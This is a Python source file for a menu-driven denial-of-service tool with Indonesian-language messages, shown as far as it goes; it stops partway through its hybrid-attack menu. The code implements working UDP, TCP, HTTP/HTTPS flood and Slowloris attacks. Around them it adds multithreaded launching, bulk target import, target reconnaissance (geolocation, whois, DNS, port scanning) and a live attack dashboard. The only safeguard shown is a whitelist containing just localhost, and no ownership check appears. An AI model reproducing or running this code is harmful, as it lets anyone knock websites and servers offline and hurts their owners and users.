#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import random
import time
import threading
import json
import csv
import hashlib
import getpass
import ipaddress
import logging
import smtplib
import select
from datetime import datetime
from email.mime.text import MIMEText

# ASCII Art Color 

#Red: \033[91m
#Green: \033[92m
#Yellow: \033[93m
#Blue: \033[94m
#Magenta: \033[95m
#Cyan: \033[96m
#White: \033[97m
#Black: \033[90m

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = ''; GREEN = ''; YELLOW = ''; BLUE = ''; MAGENTA = ''; CYAN = ''; WHITE = ''; LIGHTBLUE_EX = ''
        def __init__(self): pass
    Style = Fore
    def init(autoreset=True): pass

try:
    import requests
except ImportError:
    print("[!] requests tidak terinstal. Beberapa fitur mungkin tidak berfungsi.")
    requests = None

try:
    import whois
except ImportError:
    whois = None

try:
    import dns.resolver
except ImportError:
    dns = None

try:
    from cryptography.fernet import Fernet
except ImportError:
    Fernet = None

try:
    from reportlab.lib.pagesizes import letter
    from reportlab.pdfgen import canvas
except ImportError:
    reportlab = None

try:
    from rich.layout import Layout
    from rich.panel import Panel
    from rich.live import Live
    from rich.text import Text
    from rich.console import Console
    rich_available = True
except ImportError:
    rich_available = False

VERSION = "3.0"
DEVELOPER = "Security Tool"
WHITELIST = ['127.0.0.1']
BLACKLIST = []
CONFIG_FILE = "Config.json"
RESULTS_FILE = "Results.txt"
USER_DB = "users.json"
AUDIT_LOG = "audit.json"
SECRET_KEY_FILE = "secret.key"
STOP_FLAG = False
CURRENT_USER = None

class AttackStats:
    def __init__(self):
        self.total_packets = 0
        self.total_bytes = 0
        self.start_time = None
        self.packets_per_second = 0
        self.active_threads = 0
        self.target_status = "Unknown"
        self.target_latency = -1
        
    def start(self):
        self.start_time = time.time()
        self.total_packets = 0
        self.total_bytes = 0
        
    def update(self, packets, bytes_sent):
        self.total_packets += packets
        self.total_bytes += bytes_sent
        if self.start_time:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                self.packets_per_second = self.total_packets / elapsed
    
    def get_stats(self):
        if not self.start_time:
            return {}
        elapsed = time.time() - self.start_time
        return {
            'total_packets': self.total_packets,
            'total_bytes': self.total_bytes,
            'packets_per_second': self.packets_per_second,
            'elapsed_time': elapsed,
            'target_status': self.target_status,
            'target_latency': self.target_latency
        }

stats = AttackStats()

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def load_users():
    if os.path.exists(USER_DB):
        try:
            with open(USER_DB, 'r') as f:
                return json.load(f)
        except:
            pass
    return {"A": hash_password("A")}

def save_users(users):
    with open(USER_DB, 'w') as f:
        json.dump(users, f, indent=4)

def authenticate():
    global CURRENT_USER
    users = load_users()
    print("")
    print(Fore.CYAN + "<==[ LOGIN ]==>")
    print("")
    username = input("Username: ").strip()
    print("")
    password = getpass.getpass("Password: ")
    print("")
    if username in users and users[username] == hash_password(password):
        CURRENT_USER = username
        print(Fore.GREEN + "[✓] Login berhasil!")
        log_activity("LOGIN", f"User {username} login")
        return True
    else:
        print(Fore.RED + "[✗] Login gagal!")
        return False

def log_activity(action, details):
    if not CURRENT_USER:
        user = "unknown"
    else:
        user = CURRENT_USER
    log_entry = {
        'user': user,
        'action': action,
        'details': details,
        'timestamp': datetime.now().isoformat()
    }
    try:
        with open(AUDIT_LOG, 'a') as f:
            json.dump(log_entry, f)
            f.write('\n')
        logging.basicConfig(filename='audit.log', level=logging.INFO,
                            format='%(asctime)s - %(levelname)s - %(message)s')
        logging.info(f"{user} - {action} - {details}")
    except:
        pass

def validate_input(prompt, min_val, max_val, input_type=int, default=None):
    while True:
        try:
            value = input(Fore.LIGHTBLUE_EX + prompt)
            if value == "" and default is not None:
                return default
            value = input_type(value)
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"[❌] Must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "[❌] Invalid input! Numbers only.")

def is_ipv6(ip):
    try:
        ipaddress.IPv6Address(ip)
        return True
    except:
        return False

def is_target_allowed(ip):
    if ip in WHITELIST:
        print(Fore.YELLOW + f"[⚠️] Warning: {ip} is in whitelist! Attack blocked.")
        return False
    if ip in BLACKLIST:
        print(Fore.RED + f"[❌] Error: {ip} is in blacklist!")
        return False
    return True

def validate_target(ip, port):
    family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
    try:
        print(Fore.CYAN + f"[🔍] Checking target {ip}:{port}...")
        sock = socket.socket(family, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0:
            stats.target_status = "Online"
            print(Fore.GREEN + f"[✅] Target {ip}:{port} is online!")
            return True
        else:
            stats.target_status = "Offline/Blocked"
            print(Fore.YELLOW + f"[⚠️] Target {ip}:{port} may be offline or blocking connections")
            return True
    except Exception as e:
        print(Fore.RED + f"[❌] Connection test failed: {e}")
        return False

def get_ip_location(ip):
    if not requests:
        return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'org': 'Unknown'}
    try:
        print(Fore.CYAN + f"[🌍] Getting location for {ip}...")
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return {
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'org': data.get('org', 'Unknown')
                }
    except:
        pass
    return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'org': 'Unknown'}

def get_whois(domain):
    if not whois:
        return None
    try:
        w = whois.whois(domain)
        return {
            "registrar": w.registrar,
            "creation_date": str(w.creation_date),
            "expiration_date": str(w.expiration_date),
            "name_servers": w.name_servers
        }
    except:
        return None

def get_dns_records(domain):
    if not dns:
        return {}
    records = {}
    for qtype in ['A', 'MX', 'NS', 'TXT']:
        try:
            answers = dns.resolver.resolve(domain, qtype)
            records[qtype] = [str(r) for r in answers]
        except:
            records[qtype] = []
    return records

def http_flood(ip, port, duration, packet_size, thread_id=1, ssl=False, method="GET", path="/"):
    protocol = "https" if ssl else "http"
    url = f"{protocol}://{ip}:{port}{path}"
    end_time = time.time() + duration
    local_count = 0
    if not requests:
        return
    session = requests.Session()
    while time.time() < end_time and not STOP_FLAG:
        try:
            if method.upper() == "GET":
                session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=1)
            else:
                session.post(url, data={"key": "value"}, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=1)
            local_count += 1
            stats.update(1, 500)
        except:
            pass
    session.close()

def slowloris(ip, port, duration, packet_size, thread_id=1):
    end_time = time.time() + duration
    while time.time() < end_time and not STOP_FLAG:
        try:
            family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
            sock = socket.socket(family, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"Host: target\r\n")
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            for _ in range(10):
                if STOP_FLAG:
                    break
                sock.send(b"X-Header: data\r\n")
                time.sleep(10)
            sock.close()
            stats.update(1, 200)
        except:
            pass

def udp_spam(ip, port, duration, packet_size, thread_id=1):
    family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
    sock = socket.socket(family, socket.SOCK_DGRAM)
    sock.settimeout(0.5)
    end_time = time.time() + duration
    local_packet_count = 0
    while time.time() < end_time and not STOP_FLAG:
        payload = random.randbytes(packet_size)
        try:
            sock.sendto(payload, (ip, port))
            local_packet_count += 0
            stats.update(1, packet_size)
        except:
            break
        if local_packet_count % 100 == 0:
            time.sleep(0.01)
    sock.close()

def udp_handshake(ip, port, duration, packet_size, thread_id=1):
    family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
    sock = socket.socket(family, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    while time.time() < end_time and not STOP_FLAG:
        handshake = bytes([0x00, 0x00]) + random.randbytes(packet_size - 2)
        try:
            sock.sendto(handshake, (ip, port))
            stats.update(1, packet_size)
        except:
            break
    sock.close()

def udp_query(ip, port, duration, packet_size, thread_id=1):
    family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
    sock = socket.socket(family, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    while time.time() < end_time and not STOP_FLAG:
        query = bytes([0xFE, 0x01]) + random.randbytes(packet_size - 2)
        try:
            sock.sendto(query, (ip, port))
            stats.update(1, packet_size)
        except:
            break
    sock.close()

def tcp_connect(ip, port, duration, packet_size, thread_id=1):
    end_time = time.time() + duration
    family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
    while time.time() < end_time and not STOP_FLAG:
        try:
            sock = socket.socket(family, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                stats.update(1, 40)
            sock.close()
        except:
            pass
        if threading.current_thread().name and int(threading.current_thread().name.split('-')[-1]) % 50 == 0:
            time.sleep(0.01)

def tcp_join(ip, port, duration, packet_size, thread_id=1):
    end_time = time.time() + duration
    family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
    while time.time() < end_time and not STOP_FLAG:
        try:
            sock = socket.socket(family, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + random.randbytes(packet_size - 4)
            sock.send(handshake)
            stats.update(1, packet_size)
            sock.close()
        except:
            pass

def tcp_login(ip, port, duration, packet_size, thread_id=1):
    end_time = time.time() + duration
    family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
    while time.time() < end_time and not STOP_FLAG:
        try:
            sock = socket.socket(family, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + random.randbytes(packet_size - 12)
            sock.send(login)
            stats.update(1, packet_size)
            sock.close()
        except:
            pass

def hybrid_attack(ip, port, duration, packet_size, thread_count, methods):
    total_weight = sum(w for _, w in methods)
    threads = []
    for method, weight in methods:
        alloc = max(1, int(thread_count * weight / total_weight))
        for i in range(alloc):
            t = threading.Thread(target=method, args=(ip, port, duration, packet_size, i))
            t.daemon = True
            threads.append(t)
            t.start()
    for t in threads:
        t.join(timeout=0.1)

def threaded_attack(target_func, ip, port, duration, packet_size, thread_count=5):
    global STOP_FLAG
    STOP_FLAG = False
    threads = []
    stats.active_threads = thread_count

    probe_thread = threading.Thread(target=probe_target, args=(ip, port))
    probe_thread.daemon = True
    probe_thread.start()
    
    def attack_worker(worker_id):
        try:
            target_func(ip, port, duration, packet_size, worker_id)
        except Exception as e:
            print(Fore.RED + f"[❌] Thread {worker_id} error: {e}")
    
    print(Fore.CYAN + f"[⚡] Starting {thread_count} attack threads...")
    for i in range(thread_count):
        t = threading.Thread(target=attack_worker, args=(i+1,))
        t.daemon = True
        threads.append(t)
        t.start()

    start_time = time.time()
    while time.time() - start_time < duration and not STOP_FLAG:
        time.sleep(0.1)
    
    stats.active_threads = 0
    STOP_FLAG = True
    print(Fore.GREEN + f"[✅] All attack threads completed or stopped!")

def probe_target(ip, port, interval=5):
    family = socket.AF_INET6 if is_ipv6(ip) else socket.AF_INET
    while stats.active_threads > 0 and not STOP_FLAG:
        start = time.time()
        try:
            sock = socket.socket(family, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            latency = time.time() - start if result == 0 else -1
            stats.target_latency = latency
        except:
            stats.target_latency = -1
        finally:
            sock.close()
        time.sleep(interval)

def live_dashboard_rich():
    console = Console()
    with Live(console=console, refresh_per_second=1) as live:
        while stats.active_threads > 0 and not STOP_FLAG:
            stats_data = stats.get_stats()
            layout = Layout()
            layout.split_column(
                Layout(name="header"),
                Layout(name="stats"),
                Layout(name="graph")
            )
            header = Panel(Text("LIVE ATTACK DASHBOARD", style="bold yellow"), style="cyan")
            stats_text = Text()
            stats_text.append(f"Target Status: {stats.target_status}\n")
            stats_text.append(f"Target Latency: {stats.target_latency:.2f}s\n" if stats.target_latency>0 else "Target Latency: timeout\n")
            stats_text.append(f"Packets Sent: {stats_data['total_packets']:,}\n")
            stats_text.append(f"Bytes Sent: {stats_data['total_bytes']/1024/1024:.2f} MB\n")
            stats_text.append(f"Packets/Second: {stats_data['packets_per_second']:.2f}\n")
            stats_text.append(f"Elapsed Time: {stats_data['elapsed_time']:.2f}s\n")
            stats_text.append(f"Active Threads: {stats.active_threads}\n")
            stats_panel = Panel(stats_text, title="Statistics")
            graph_bar = "█" * min(int(stats_data['packets_per_second']/10), 50)
            graph_text = Text(graph_bar, style="green")
            graph_panel = Panel(graph_text, title="Traffic Graph (1 bar = 10 pps)")
            layout["header"].update(header)
            layout["stats"].update(stats_panel)
            layout["graph"].update(graph_panel)
            live.update(layout)
            time.sleep(1)

def live_dashboard_simple():
    os.system('clear')
    print(Fore.CYAN + "="*60)
    print(Fore.YELLOW + "LIVE ATTACK DASHBOARD")
    print(Fore.CYAN + "="*60)
    stats_data = stats.get_stats()
    if stats_data:
        print(f"{Fore.GREEN}Target Status: {stats.target_status}")
        print(f"{Fore.GREEN}Target Latency: {stats.target_latency:.2f}s" if stats.target_latency>0 else f"{Fore.RED}Target Latency: timeout")
        print(f"{Fore.CYAN}Packets Sent: {stats_data['total_packets']:,}")
        print(f"{Fore.CYAN}Bytes Sent: {stats_data['total_bytes']:,} ({stats_data['total_bytes']/1024/1024:.2f} MB)")
        print(f"{Fore.CYAN}Packets/Second: {stats_data['packets_per_second']:.2f}")
        print(f"{Fore.CYAN}Elapsed Time: {stats_data['elapsed_time']:.2f}s")
        print(f"{Fore.CYAN}Active Threads: {stats.active_threads}")
    else:
        print(f"{Fore.YELLOW}No attack running...")
    print(Fore.CYAN + "="*60)
    print(Fore.YELLOW + "Press 'e' for Emergency Stop, Ctrl+C to stop attack")
    print(Fore.CYAN + "="*60)

def start_monitor(interval=2):
    def monitor():
        global STOP_FLAG
        if rich_available:
            live_dashboard_rich()
        else:
            while stats.active_threads > 0 and not STOP_FLAG:
                live_dashboard_simple()
                if select.select([sys.stdin], [], [], 0)[0]:
                    key = sys.stdin.read(1)
                    if key.lower() == 'e':
                        STOP_FLAG = True
                        print(Fore.RED + "\n[!] EMERGENCY STOP ACTIVATED!")
                        break
                time.sleep(interval)
    monitor_thread = threading.Thread(target=monitor)
    monitor_thread.daemon = True
    monitor_thread.start()
    return monitor_thread

def generate_pdf_report(attack_data, filename="report.pdf"):
    if not reportlab:
        print(Fore.YELLOW + "[!] reportlab tidak terinstal. Laporan PDF tidak dibuat.")
        return
    try:
        c = canvas.Canvas(filename, pagesize=letter)
        c.setFont("Helvetica", 12)
        y = 750
        for key, value in attack_data.items():
            c.drawString(50, y, f"{key}: {value}")
            y -= 20
        c.save()
        print(Fore.GREEN + f"[✓] Laporan PDF disimpan: {filename}")
        log_activity("REPORT_PDF", f"Laporan PDF dibuat: {filename}")
    except Exception as e:
        print(Fore.RED + f"[✗] Gagal membuat PDF: {e}")

def generate_html_report(attack_data, filename="report.html"):
    try:
        html = f"""<html><head><title>Attack Report</title></head><body>
        <h1>Attack Report - {datetime.now()}</h1>
        <table border="1">
        """
        for key, value in attack_data.items():
            html += f"<tr><td>{key}</td><td>{value}</td></tr>"
        html += "</table></body></html>"
        with open(filename, 'w') as f:
            f.write(html)
        print(Fore.GREEN + f"[✓] Laporan HTML disimpan: {filename}")
        log_activity("REPORT_HTML", f"Laporan HTML dibuat: {filename}")
    except Exception as e:
        print(Fore.RED + f"[✗] Gagal membuat HTML: {e}")

def load_key():
    if not os.path.exists(SECRET_KEY_FILE):
        if not Fernet:
            print(Fore.YELLOW + "[!] cryptography tidak terinstal. Enkripsi tidak tersedia.")
            return None
        key = Fernet.generate_key()
        with open(SECRET_KEY_FILE, "wb") as key_file:
            key_file.write(key)
    else:
        with open(SECRET_KEY_FILE, "rb") as key_file:
            key = key_file.read()
    return key

def encrypt_file(filename):
    key = load_key()
    if not key:
        return
    fernet = Fernet(key)
    with open(filename, 'rb') as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(filename + '.enc', 'wb') as f:
        f.write(encrypted)
    print(Fore.GREEN + f"[✓] File {filename} terenkripsi.")

def decrypt_file(enc_filename):
    key = load_key()
    if not key:
        return None
    fernet = Fernet(key)
    with open(enc_filename, 'rb') as f:
        encrypted = f.read()
    decrypted = fernet.decrypt(encrypted)
    return decrypted.decode()

def save_config(config_data, encrypt=False):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config_data, f, indent=4)
        if encrypt:
            encrypt_file(CONFIG_FILE)
        print(Fore.GREEN + f"[✅] Configuration saved to {CONFIG_FILE}")
        log_activity("SAVE_CONFIG", f"Konfigurasi disimpan, encrypt={encrypt}")
        return True
    except Exception as e:
        print(Fore.RED + f"[❌] Failed to save config: {e}")
        return False

def load_config(decrypt=False):
    try:
        if decrypt and os.path.exists(CONFIG_FILE + '.enc'):
            data = decrypt_file(CONFIG_FILE + '.enc')
            if data:
                config = json.loads(data)
                print(Fore.GREEN + f"[✅] Configuration loaded from {CONFIG_FILE}.enc")
                return config
        elif os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
            print(Fore.GREEN + f"[✅] Configuration loaded from {CONFIG_FILE}")
            return config
    except Exception as e:
        print(Fore.RED + f"[❌] Failed to load config: {e}")
    return None

def import_targets(filename):
    targets = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if ':' in line:
                        ip, port = line.split(':')
                        port = int(port)
                    else:
                        ip = line
                        port = 80
                    targets.append((ip, port))
        print(Fore.GREEN + f"[✓] {len(targets)} target diimpor dari {filename}")
        log_activity("IMPORT_TARGETS", f"{len(targets)} target dari {filename}")
    except Exception as e:
        print(Fore.RED + f"[✗] Gagal membaca file: {e}")
    return targets

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
]

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f""""""
    print(Fore.CYAN + banner)

def show_main_menu():
    print(Fore.LIGHTBLUE_EX + "\n        🔹 MAIN MENU 🔹        ")
    print(Fore.BLUE + "\033[92m=\033[97m"*32)
    print("")
    print("  \033[92m[1]\033[97m \033[91mNetwork Attack Methods\033[97m")
    print("")
    print("  \033[92m[2]\033[97m \033[91mTarget Information\033[97m")
    print("")
    print("  \033[92m[3]\033[97m \033[91mLoad/Save Configuration\033[97m")
    print("")
    print("  \033[92m[4]\033[97m \033[91mView Previous Results\033[97m")
    print("")
    print("  \033[92m[5]\033[97m \033[91mSettings & Whitelist\033[97m")
    print("")
    print("  \033[92m[6]\033[97m \033[91mImport Targets from File (Fitur 13)\033[97m")
    print("")
    print("  \033[92m[7]\033[97m \033[91mHybrid Attack Mode (Fitur 7)\033[97m")
    print("")
    print("  \033[92m[8]\033[97m \033[91mGenerate Report (Fitur 4)\033[91m")
    print("")
    print("  \033[92m[9]\033[97m \033[91mVerify Target Ownership (Fitur 6)\033[97m")
    print("")
    print("  \033[92m[0]\033[97m \033[91mExit\033[97m")
    print("")
    choice = input(Fore.LIGHTBLUE_EX + "\033[97mSelect option (0-9): \033[92m").strip()
    return choice

def show_attack_menu():
    print_banner()
    print(Fore.LIGHTBLUE_EX + "\n    🔹 ATTACK METHODS 🔹    ")
    print(Fore.BLUE + "\033[92m=\033[97m"*32)
    print()
    print(Fore.YELLOW + "[UDP ATTACKS]")
    print("  \033[92m[1]\033[97m \033[91mUDP Spam Flood\033[97m")
    print("")
    print("  \033[92m[2]\033[97m \033[91mUDP Handshake Flood\033[97m")
    print("")
    print("  \033[92m[3]\033[97m \033[91mUDP Query Flood\033[97m")
    print()
    print("")
    print(Fore.YELLOW + "[TCP ATTACKS]")
    print("  \033[92m[4]\033[97m \033[91mTCP Connect Flood\033[97m")
    print("")
    print("  \033[92m[5]\033[97m \033[91mTCP Join Flood\033[97m")
    print("")
    print("  \033[92m[6]\033[97m \033[91mTCP Login Flood\033[97m")
    print()
    print("")
    print(Fore.YELLOW + "[LAYER 7 ATTACKS]")
    print("  \033[92m[7]\033[97m \033[91mHTTP/HTTPS Flood (Fitur 2)\033[97m")
    print("")
    print("  \033[92m[8]\033[97m \033[91mSlowloris Attack (Fitur 11)\033[97m")
    print()
    print("  \033[92m[0]\033[97m \033[91mBack to Main Menu\033[97m")
    print()
    choice = input(Fore.LIGHTBLUE_EX + "Select method (0-8): ").strip()
    return choice

def get_attack_parameters():
    print()
    print(Fore.LIGHTBLUE_EX + "   🔹 ATTACK PARAMETERS 🔹   ")
    print(Fore.BLUE + "="*30)
    
    while True:
        ip = input(Fore.LIGHTBLUE_EX + "Target IP/Domain: ").strip()
        if ip:
            if not is_target_allowed(ip):
                continue
            break
    
    port = validate_input("Target Port (1-65535, default 80): ", 1, 65535, default=80)
    duration = validate_input("Duration in seconds: ", 1, 99999, float, default=99999)
    packet_size = validate_input("Packet size in bytes (65500): ", 1, 65500, default=65500)
    thread_count = validate_input("Thread count (default 100): ", 1, 1000, default=100)
    
    return {
        'ip': ip,
        'port': port,
        'duration': duration,
        'packet_size': packet_size,
        'thread_count': thread_count
    }

def run_attack(method_choice, params):
    attack_methods = {
        '1': (udp_spam, "UDP Spam Flood"),
        '2': (udp_handshake, "UDP Handshake Flood"),
        '3': (udp_query, "UDP Query Flood"),
        '4': (tcp_connect, "TCP Connect Flood"),
        '5': (tcp_join, "TCP Join Flood"),
        '6': (tcp_login, "TCP Login Flood"),
        '7': (http_flood, "HTTP/HTTPS Flood"),
        '8': (slowloris, "Slowloris Attack")
    }
    
    if method_choice in attack_methods:
        method_func, method_name = attack_methods[method_choice]
        
        print()
        print(Fore.YELLOW + "="*60)
        print(Fore.RED + f"STARTING {method_name}")
        print(Fore.YELLOW + "="*60)
        print(Fore.CYAN + f"Target: {params['ip']}:{params['port']}")
        print(Fore.CYAN + f"Duration: {params['duration']} seconds")
        print(Fore.CYAN + f"Threads: {params['thread_count']}")
        print(Fore.YELLOW + "="*60)
        
        send_notification("Attack Started", f"{method_name} on {params['ip']}:{params['port']}")
        
        if not validate_target(params['ip'], params['port']):
            confirm = input(Fore.YELLOW + "[⚠️] Target may be offline. Continue? (y/n): ").lower()
            if confirm != 'y':
                return None
        
        stats.start()
        monitor_thread = start_monitor()
        
        log_activity("ATTACK_START", f"{method_name} on {params['ip']}:{params['port']}")
        
        try:
            threaded_attack(
                method_func,
                params['ip'],
                params['port'],
                params['duration'],
                params['packet_size'],
                params['thread_count']
            )
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[⚠️] Attack interrupted by user!")
            log_activity("ATTACK_INTERRUPT", "User interrupt")
        except Exception as e:
            print(Fore.RED + f"[❌] Attack failed: {e}")
            log_activity("ATTACK_ERROR", str(e))
        
        final_stats = stats.get_stats()
        if final_stats:
            print()
            print(Fore.GREEN + "="*60)
            print(Fore.GREEN + "ATTACK COMPLETED!")
            print(Fore.GREEN + "="*60)
            print(Fore.CYAN + f"Total Packets: {final_stats['total_packets']:,}")
            print(Fore.CYAN + f"Total Data: {final_stats['total_bytes']/1024/1024:.2f} MB")
            print(Fore.CYAN + f"Average Speed: {final_stats['packets_per_second']:.2f} packets/sec")
            print(Fore.CYAN + f"Duration: {final_stats['elapsed_time']:.2f} seconds")
            print(Fore.GREEN + "="*60)
            
            send_notification("Attack Finished", f"{method_name} completed. Packets: {final_stats['total_packets']}")
        
        return final_stats
    else:
        print(Fore.RED + "[❌] Invalid attack method!")
        return None

def show_target_info():
    print_banner()
    print(Fore.LIGHTBLUE_EX + "   🔹 TARGET INFORMATION 🔹   ")
    print(Fore.BLUE + "="*31)
    
    target = input(Fore.LIGHTBLUE_EX + "Enter IP or Domain: ").strip()
    if not target:
        return
    
    print()
    print(Fore.CYAN + "[🔍] Gathering information...")
    
    location = get_ip_location(target)
    print(Fore.GREEN + f"Country: {location['country']}")
    print(Fore.GREEN + f"City: {location['city']}")
    print(Fore.GREEN + f"ISP: {location['isp']}")
    print(Fore.GREEN + f"Organization: {location['org']}")
    
    if not is_ipv6(target) and not target.replace('.','').isdigit():
        whois_info = get_whois(target)
        if whois_info:
            print(Fore.GREEN + f"Registrar: {whois_info['registrar']}")
            print(Fore.GREEN + f"Creation: {whois_info['creation_date']}")
            print(Fore.GREEN + f"Expiration: {whois_info['expiration_date']}")
            print(Fore.GREEN + f"Name Servers: {', '.join(whois_info['name_servers'] if whois_info['name_servers'] else [])}")
    
    dns_records = get_dns_records(target)
    if dns_records:
        for qtype, records in dns_records.items():
            if records:
                print(Fore.GREEN + f"{qtype} Records: {', '.join(records)}")
    
    print()
    print(Fore.CYAN + "[🔍] Scanning common ports...")
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 8080, 8443]
    open_ports = []
    for port in common_ports[:10]:
        family = socket.AF_INET6 if is_ipv6(target) else socket.AF_INET
        try:
            sock = socket.socket(family, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    if open_ports:
        print(Fore.GREEN + f"Open ports: {', '.join(map(str, open_ports))}")
    else:
        print(Fore.YELLOW + "No common ports open (or filtered)")
    
    log_activity("TARGET_INFO", f"Informasi target {target}")
    input(Fore.CYAN + "\nPress Enter to continue...")

def show_settings():
    global WHITELIST, BLACKLIST
    print_banner()
    print(Fore.LIGHTBLUE_EX + "   🔹 SETTINGS & CONFIGURATION 🔹   ")
    print(Fore.BLUE + "="*37)
    print()
    print(Fore.YELLOW + "[1] View Whitelist")
    print(Fore.YELLOW + "[2] Add to Whitelist")
    print(Fore.YELLOW + "[3] Remove from Whitelist")
    print(Fore.YELLOW + "[4] View Blacklist")
    print(Fore.YELLOW + "[5] Back to Main")
    print()
    choice = input(Fore.LIGHTBLUE_EX + "Select option: ").strip()
    if choice == '1':
        print(Fore.GREEN + f"\nWhitelist: {WHITELIST}")
    elif choice == '2':
        ip = input(Fore.CYAN + "IP to whitelist: ").strip()
        if ip and ip not in WHITELIST:
            WHITELIST.append(ip)
            print(Fore.GREEN + f"[✅] Added {ip} to whitelist")
    elif choice == '3':
        ip = input(Fore.CYAN + "IP to remove: ").strip()
        if ip in WHITELIST:
            WHITELIST.remove(ip)
            print(Fore.GREEN + f"[✅] Removed {ip} from whitelist")
    input(Fore.CYAN + "\nPress Enter to continue...")

def generate_report_menu():
    print_banner()
    print(Fore.LIGHTBLUE_EX + "   🔹 GENERATE REPORT 🔹   ")
    print(Fore.BLUE + "="*30)
    print()
    if not os.path.exists(RESULTS_FILE):
        print(Fore.YELLOW + "No results file found.")
        input("Press Enter...")
        return
    try:
        with open(RESULTS_FILE, 'r') as f:
            content = f.read()
        import re
        last_attack = {}
        lines = content.strip().split('\n')
        for line in lines[-20:]:
            if ':' in line:
                parts = line.split(':', 1)
                key = parts[0].strip()
                value = parts[1].strip()
                last_attack[key] = value
        print(Fore.CYAN + "Data terakhir:")
        for k, v in last_attack.items():
            print(f"{k}: {v}")
        print()
        fmt = input("Pilih format (pdf/html): ").lower()
        if fmt == 'pdf':
            generate_pdf_report(last_attack, f"report_{int(time.time())}.pdf")
        elif fmt == 'html':
            generate_html_report(last_attack, f"report_{int(time.time())}.html")
        else:
            print(Fore.RED + "Format tidak dikenal.")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
    input("Press Enter...")

def import_targets_menu():
    print_banner()
    print(Fore.LIGHTBLUE_EX + "   🔹 IMPORT TARGETS FROM FILE 🔹   ")
    print(Fore.BLUE + "="*38)
    filename = input("Nama file (contoh: targets.txt): ").strip()
    if not filename:
        return
    targets = import_targets(filename)
    if not targets:
        return
    print(Fore.CYAN + "\nTarget yang diimpor:")
    for i, (ip, port) in enumerate(targets, 1):
        print(f"{i}. {ip}:{port}")
    choice = input("\nPilih nomor target untuk diserang, atau 0 untuk semua: ").strip()
    if choice == '0':
        for ip, port in targets:
            print(Fore.YELLOW + f"\n--- Menyerang {ip}:{port} ---")
            params = {
                'ip': ip,
                'port': port,
                'duration': validate_input("Duration: ", 1, 99999, float, default=60),
                'packet_size': validate_input("Packet size: ", 1, 65500, default=65500),
                'thread_count': validate_input("Thread count: ", 1, 1000, default=100)
            }
            method = show_attack_menu()
            if method != '0':
                run_attack(method, params)
    else:
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(targets):
                ip, port = targets[idx]
                params = get_attack_parameters()
                params['ip'] = ip
                params['port'] = port
                method = show_attack_menu()
                if method != '0':
                    run_attack(method, params)
        except:
            print(Fore.RED + "Pilihan tidak valid.")
    input("Press Enter...")

def hybrid_attack_menu():
    print_banner()
    print(Fore.LIGHTBLUE_EX + "   🔹 HYBRID ATTACK MODE 🔹   ")
    print(Fore.BLUE + "="*32)
    params = get_attack_parameters()
    if not params:
        return
    print(Fore.CYAN + "\nPilih metode serangan (pisahkan dengan koma, contoh: 1,4,7):")
    print("1. UDP Spam  2. UDP Handshake  3. UDP Query  4. TCP Connect  5. TCP Join  6. TCP Login  7. HTTP Flood  8. Slowloris")
    choices = input("Metode: ").strip().split(',')
    methods = []
    method_map = {
        '1': (udp_spam, 1),
        '2': (udp_handshake, 1),
        '3': (udp_query, 1),
        '4': (tcp_connect, 1),
        '5': (tcp_join, 1),
        '6': (tcp_login, 1),
        '7': (http_flood, 1),
        '8': (slowloris, 1)
    }
    for c in choices:
        c = c.strip()
